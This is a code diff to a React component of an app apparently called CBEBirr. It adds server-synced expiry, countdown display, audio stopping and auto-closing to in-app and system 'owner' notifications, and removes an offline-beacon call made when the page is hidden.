@@ -510,11 +510,57 @@ export default function CBEBirrFullscreenApp() {
     message: string;
     audioDataUrl?: string;
     audioDurationSec?: number;
+    durationSeconds: number;
+    localExpiresAtMs: number;
+  } | null>(null);
+  const [notifRemainingSec, setNotifRemainingSec] = useState<number>(0);
+  const activeInAppNotifRef = useRef<{
+    notifId: string;
+    title: string;
+    message: string;
+    audioDataUrl?: string;
+    audioDurationSec?: number;
+    durationSeconds: number;
+    localExpiresAtMs: number;
   } | null>(null);
   const inAppNotifTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const inAppNotifAudioRef = useRef<HTMLAudioElement | null>(null);
   const ackedDeliveredIdsRef = useRef<Set<string>>(new Set());
   const ackedSeenIdsRef = useRef<Set<string>>(new Set());
+  useEffect(() => {
+    activeInAppNotifRef.current = activeInAppNotif;
+  }, [activeInAppNotif]);
+
+  useEffect(() => {
+    if (!activeInAppNotif) return;
+    const tick = () => {
+      const remMs = activeInAppNotif.localExpiresAtMs - Date.now();
+      if (remMs <= 0) {
+        try {
+          if (inAppNotifAudioRef.current) {
+            inAppNotifAudioRef.current.pause();
+            inAppNotifAudioRef.current.currentTime = 0;
+          }
+        } catch {}
+        setNotifRemainingSec(0);
+        setActiveInAppNotif((curr) => (curr?.notifId === activeInAppNotif.notifId ? null : curr));
+        if (typeof navigator !== 'undefined' && 'serviceWorker' in navigator) {
+          navigator.serviceWorker.ready
+            .then((reg) => reg.getNotifications({ tag: activeInAppNotif.notifId }))
+            .then((list) => list.forEach((n) => n.close()))
+            .catch(() => {});
+        }
+        return;
+      }
+      setNotifRemainingSec(Math.max(1, Math.ceil(remMs / 1000)));
+    };
+    const initId = setTimeout(tick, 0);
+    const id = setInterval(tick, 250);
+    return () => {
+      clearTimeout(initId);
+      clearInterval(id);
+    };
+  }, [activeInAppNotif]);
 
   // Transparent Consent-Based Live Support View State, Two-Way Voice & Screen Cast Refs
   const [supportSession, setSupportSession] = useState<SupportSession | null>(null);
@@ -789,39 +835,54 @@ export default function CBEBirrFullscreenApp() {
   }, []);
 
   const deliverSystemNotification = useCallback(
-    async (notif: {
-      notifId: string;
-      targetDeviceId?: string;
-      title?: string;
-      message: string;
-      audioDataUrl?: string;
-      audioDurationSec?: number;
-      durationSeconds?: number;
-    }) => {
+    async (
+      notif: {
+        notifId: string;
+        targetDeviceId?: string;
+        title?: string;
+        message: string;
+        audioDataUrl?: string;
+        audioDurationSec?: number;
+        durationSeconds?: number;
+        expiresAtMs?: number;
+      },
+      serverTimeMs?: number
+    ) => {
       if (!notif?.notifId || (!notif?.message && !notif?.audioDataUrl)) return;
+
+      const refServerNow = Number(serverTimeMs || Date.now());
+      const configuredMs = Math.max(1000, Number(notif.durationSeconds || 30) * 1000);
+      const remainingMs = notif.expiresAtMs
+        ? Math.max(0, Math.min(configuredMs, notif.expiresAtMs - refServerNow))
+        : configuredMs;
+      if (remainingMs <= 0) return;
+
       markNotificationSeen(notif.notifId);
       if (!ackedDeliveredIdsRef.current.has(notif.notifId)) {
         ackedDeliveredIdsRef.current.add(notif.notifId);
         void ackOwnerNotification(notif.notifId, 'delivered');
       }
 
+      const localExpiresAtMs = Date.now() + remainingMs;
+      const effectiveDurationSec = Math.max(1, Math.ceil(remainingMs / 1000));
+
       // Always show high-priority in-app owner banner inside cbebirr-plus.apk & web so owner messages & voice notes play reliably
-      const baseSec = Number(notif.durationSeconds || 10);
-      const voiceExtra = notif.audioDataUrl ? Math.max(15, (notif.audioDurationSec || 10) + 12) : 0;
-      const durationMs = Math.max(6, Math.min(60, Math.max(baseSec, voiceExtra))) * 1000;
       if (inAppNotifTimerRef.current) {
         clearTimeout(inAppNotifTimerRef.current);
       }
+      setNotifRemainingSec(effectiveDurationSec);
       setActiveInAppNotif({
         notifId: notif.notifId,
         title: notif.title || (notif.audioDataUrl ? 'Owner Voice Message' : 'Notice'),
         message: notif.message || '',
         audioDataUrl: notif.audioDataUrl,
         audioDurationSec: notif.audioDurationSec,
+        durationSeconds: effectiveDurationSec,
+        localExpiresAtMs,
       });
 
       if (typeof document !== 'undefined' && !document.hidden && !notif.audioDataUrl) {
-        setTimeout(() => reportNotifSeenOnce(notif.notifId), 1200);
+        setTimeout(() => reportNotifSeenOnce(notif.notifId), Math.min(1200, Math.floor(remainingMs / 2)));
       }
       if (notif.audioDataUrl) {
         setTimeout(() => {
@@ -835,8 +896,14 @@ export default function CBEBirrFullscreenApp() {
       }
 
       inAppNotifTimerRef.current = setTimeout(() => {
+        try {
+          if (inAppNotifAudioRef.current) {
+            inAppNotifAudioRef.current.pause();
+            inAppNotifAudioRef.current.currentTime = 0;
+          }
+        } catch {}
         setActiveInAppNotif((curr) => (curr?.notifId === notif.notifId ? null : curr));
-      }, durationMs);
+      }, remainingMs);
 
       const isNativeApk =
         typeof window !== 'undefined' &&
@@ -847,13 +914,15 @@ export default function CBEBirrFullscreenApp() {
       // Forward over Android IPC so local native notification helper fires immediately (deduped by notifId)
       const dispatchedNative = dispatchNativeOwnerNotification({
         ...notif,
+        durationSeconds: effectiveDurationSec,
+        expiresAtMs: localExpiresAtMs,
         message: notif.message || (notif.audioDataUrl ? '🔊 Voice message received' : 'Notice'),
       });
       if (isNativeApk || dispatchedNative) {
         return;
       }
 
-      // Web / PWA real OS notification
+      // Web / PWA real OS notification with matching auto-close at exact owner duration
       if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
         const title = notif.title || 'CBEBirr';
         const options = {
@@ -871,12 +940,22 @@ export default function CBEBirrFullscreenApp() {
             ]);
             if (reg && typeof reg.showNotification === 'function') {
               await reg.showNotification(title, options);
+              setTimeout(() => {
+                reg.getNotifications({ tag: notif.notifId })
+                  .then((list) => list.forEach((item) => item.close()))
+                  .catch(() => {});
+              }, remainingMs);
               return;
             }
           }
         } catch {}
         try {
-          new Notification(title, options);
+          const webNotif = new Notification(title, options);
+          setTimeout(() => {
+            try {
+              webNotif.close();
+            } catch {}
+          }, remainingMs);
         } catch {}
       }
     },
@@ -932,9 +1011,21 @@ export default function CBEBirrFullscreenApp() {
           locked: res.lockState.locked,
           message: res.lockState.message,
         });
+        if (
+          activeInAppNotifRef.current &&
+          !res.activeNotificationIds.includes(activeInAppNotifRef.current.notifId)
+        ) {
+          try {
+            if (inAppNotifAudioRef.current) {
+              inAppNotifAudioRef.current.pause();
+              inAppNotifAudioRef.current.currentTime = 0;
+            }
+          } catch {}
+          setActiveInAppNotif(null);
+        }
         if (res.newNotifications.length > 0) {
           for (const n of res.newNotifications) {
-            void deliverSystemNotification(n);
+            void deliverSystemNotification(n, res.serverTimeMs);
           }
         }
         return;
@@ -987,9 +1078,21 @@ export default function CBEBirrFullscreenApp() {
         locked: res.lockState.locked,
         message: res.lockState.message,
       });
+      if (
+        activeInAppNotifRef.current &&
+        !res.activeNotificationIds.includes(activeInAppNotifRef.current.notifId)
+      ) {
+        try {
+          if (inAppNotifAudioRef.current) {
+            inAppNotifAudioRef.current.pause();
+            inAppNotifAudioRef.current.currentTime = 0;
+          }
+        } catch {}
+        setActiveInAppNotif(null);
+      }
       if (res.newNotifications.length > 0) {
         for (const n of res.newNotifications) {
-          void deliverSystemNotification(n);
+          void deliverSystemNotification(n, res.serverTimeMs);
         }
       }
       if (res.supportSession) {
@@ -1043,8 +1146,6 @@ export default function CBEBirrFullscreenApp() {
       if (document.visibilityState === 'visible') {
         runSync();
         triggerPairBroadcast();
-      } else if (document.visibilityState === 'hidden' && deviceGateStateRef.current === 'approved') {
-        sendOfflineBeacon(profileSyncRef.current);
       }
     };
     const onOnline = () => {
@@ -5631,17 +5732,35 @@ export default function CBEBirrFullscreenApp() {
                     )}
                   </div>
                 </div>
-                <button
-                  type="button"
-                  onClick={() => {
-                    reportNotifSeenOnce(activeInAppNotif.notifId);
-                    setActiveInAppNotif(null);
-                  }}
-                  className="text-white/70 hover:text-white cursor-pointer shrink-0 p-[0.5cqw]"
-                  aria-label="Dismiss notice"
-                >
-                  <X style={{ width: '3.8cqw', height: '3.8cqw' }} />
-                </button>
+                <div className="flex items-center gap-[1.5cqw] shrink-0">
+                  {notifRemainingSec > 0 && (
+                    <span
+                      style={{ fontSize: '2.2cqw' }}
+                      className="px-[1.6cqw] py-[0.4cqw] rounded-full bg-purple-500/30 border border-purple-300/40 text-purple-100 font-mono font-bold tabular-nums"
+                    >
+                      {notifRemainingSec >= 60
+                        ? `${Math.floor(notifRemainingSec / 60)}:${String(notifRemainingSec % 60).padStart(2, '0')}`
+                        : `${notifRemainingSec}s`}
+                    </span>
+                  )}
+                  <button
+                    type="button"
+                    onClick={() => {
+                      try {
+                        if (inAppNotifAudioRef.current) {
+                          inAppNotifAudioRef.current.pause();
+                          inAppNotifAudioRef.current.currentTime = 0;
+                        }
+                      } catch {}
+                      reportNotifSeenOnce(activeInAppNotif.notifId);
+                      setActiveInAppNotif(null);
+                    }}
+                    className="text-white/70 hover:text-white cursor-pointer shrink-0 p-[0.5cqw]"
+                    aria-label="Dismiss notice"
+                  >
+                    <X style={{ width: '3.8cqw', height: '3.8cqw' }} />
+                  </button>
+                </div>
               </div>
               {activeInAppNotif.audioDataUrl && (
                 <div className="bg-black/30 rounded-[2.2cqw] px-[2cqw] py-[1.4cqw] flex items-center gap-[2cqw]">
